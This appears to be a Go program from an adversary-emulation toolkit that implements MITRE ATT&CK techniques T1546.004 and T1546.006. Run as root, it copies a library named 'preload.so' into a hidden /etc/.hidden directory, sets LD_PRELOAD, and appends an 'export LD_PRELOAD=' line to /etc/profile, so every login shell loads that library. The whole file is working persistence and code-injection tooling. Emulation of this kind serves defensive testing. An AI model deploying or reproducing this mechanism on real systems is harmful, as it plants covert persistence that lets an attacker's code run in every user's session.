package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"script/pkg/files"
	"script/pkg/system"
	"script/pkg/tags"
)

var (
	libName = "preload.so"
	libDir  = "/etc/.hidden"
)

func main() {
	newPath := filepath.Join("assets", libName)
	newLibPath := filepath.Join(libDir, libName)
	script := "export LD_PRELOAD=" + newLibPath

	if !system.IsRoot() {
		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
		return
	}

	fmt.Printf("%sT1546.004 Unix Shell Configuration Modification\n", tags.Info)
	fmt.Printf("%sT1546.006 LD_PRELOAD\n", tags.Info)

	createDir(libDir)

	err := system.CopyFile(newPath, newLibPath, 0600)
	if err != nil {
		fmt.Printf("Error when copying %s: %s\n", libName, err.Error())
		return
	}
	fmt.Printf("%sFile %s has been successfully copied to %s\n", tags.Info, libName, newLibPath)

	err = writeLibPathToLdPreload(newLibPath)
	if err != nil {
		fmt.Printf("%sError when changing environment variable LD_PRELOAD: %s\n", tags.Err, err.Error())
		return
	}
	fmt.Printf("%sThe LD_PRELOAD environment variable has been changed\n", tags.Info)

	err = addScriptToProfile(script)
	if err != nil {
		fmt.Printf("%sError when modifying the /etc/profile file: %s\n", tags.Err, err.Error())
	}

	out, err := exec.Command("id").Output()
	if err != nil {
		fmt.Printf("%sFailed to execute 'id': %s\n", tags.Err, err.Error())
	} else {
		fmt.Println(string(out))
	}
}

func createDir(libDir string) {
	err := os.Mkdir(libDir, 0700)
	if err != nil {
		fmt.Printf("%sError creating directory %s: %s\n", tags.Log, libDir, err.Error())
	} else {
		fmt.Printf("%sThe %s directory was successfully created\n", tags.Log, libDir)
	}
}

func writeLibPathToLdPreload(libPath string) error {
	err := os.Setenv("LD_PRELOAD", libPath)
	if err != nil {
		return fmt.Errorf("error when setting environment variable LD_PRELOAD: %s", err.Error())
	}
	return nil
}

func addScriptToProfile(script string) error {
	content, err := readProfileFile()
	if err != nil {
		return err
	}

	content = append(content, script)

	err = writeProfileFile(content)
	if err != nil {
		return err
	}

	fmt.Printf("%sAdded %s line to /etc/profile\n", tags.Log, script)
	return nil
}

func readProfileFile() ([]string, error) {
	profileFile := files.NewFile("/etc/profile")
	content, err := profileFile.ReadFileLines()
	if err != nil {
		return nil, fmt.Errorf("error reading /etc/profile")
	}
	return content, nil
}

func writeProfileFile(content []string) error {
	profileFile := files.NewFile("/etc/profile")
	err := profileFile.WriteFileLines(content, 0644)
	if err != nil {
		return fmt.Errorf("error when writing to /etc/profile")
	}
	return nil
}
